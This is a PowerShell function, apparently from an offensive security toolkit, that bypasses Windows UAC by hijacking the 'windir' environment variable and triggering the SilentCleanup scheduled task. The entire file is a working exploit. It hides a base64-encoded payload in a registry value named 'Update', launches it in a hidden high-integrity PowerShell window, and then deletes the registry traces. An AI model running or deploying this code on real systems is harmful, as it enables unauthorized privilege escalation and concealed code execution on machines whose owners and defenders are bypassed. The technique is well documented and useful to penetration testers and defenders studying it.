function Invoke-EnvBypass {
<#
.SYNOPSIS

Bypasses UAC (even with Always Notify level set) by performing an registry modification of the "windir" value in "Environment" based on James Forshaw findings (https://tyranidslair.blogspot.cz/2017/05/exploiting-environment-variables-in.html)

Only tested on Windows 10

Author: Petr Medonos (@PetrMedonos)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Command

 Specifies the base64 encoded command you want to run in a high-integrity context.

.EXAMPLE

Invoke-EnvBypass -Command "IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

This will write out "Is Elevated: True" to C:\UACBypassTest.

#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
        Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

     #Begin Execution
     #Store the payload
     $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
     $parts = $RegPath.split('\');
     $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
     $name = $parts[-1];
     $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;


     $envCommandPath = "HKCU:\Environment"
     $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1'

     if ($Force -or ((Get-ItemProperty -Path $envCommandPath -Name 'windir' -ErrorAction SilentlyContinue) -eq $null)){
         New-Item $envCommandPath -Force |
             New-ItemProperty -Name 'windir' -Value $launcherCommand -PropertyType string -Force | Out-Null
     }else{
         Write-Warning "Key already exists, consider using -Force"
         exit
     }

     if (Test-Path $envCommandPath) {
         Write-Verbose "Created registry entries to change windir"
     }else{
         Write-Warning "Failed to create registry key, exiting"
         exit
     }

     $schtasksPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'schtasks.exe'
     if ($PSCmdlet.ShouldProcess($schtasksPath, 'Start process')) {
         $Process = Start-Process -FilePath $schtasksPath -ArgumentList '/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I' -PassThru -WindowStyle Hidden
         Write-Verbose "Started schtasks.exe"
     }

     #Sleep 5 seconds 
     Write-Verbose "Sleeping 5 seconds to trigger payload"
     if (-not $PSBoundParameters['WhatIf']) {
         Start-Sleep -Seconds 5
     }

     $envfilePath = "HKCU:\Environment"
     $envfileKey = "windir"
     $PayloadPath = 'HKCU:Software\Microsoft\Windows'
     $PayloadKey = "Update"

     if (Test-Path $envfilePath) {
         #Remove the registry entry
         Remove-ItemProperty -Force -Path $envfilePath -Name $envfileKey
         Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
         Write-Verbose "Removed registry entries"
     }
}
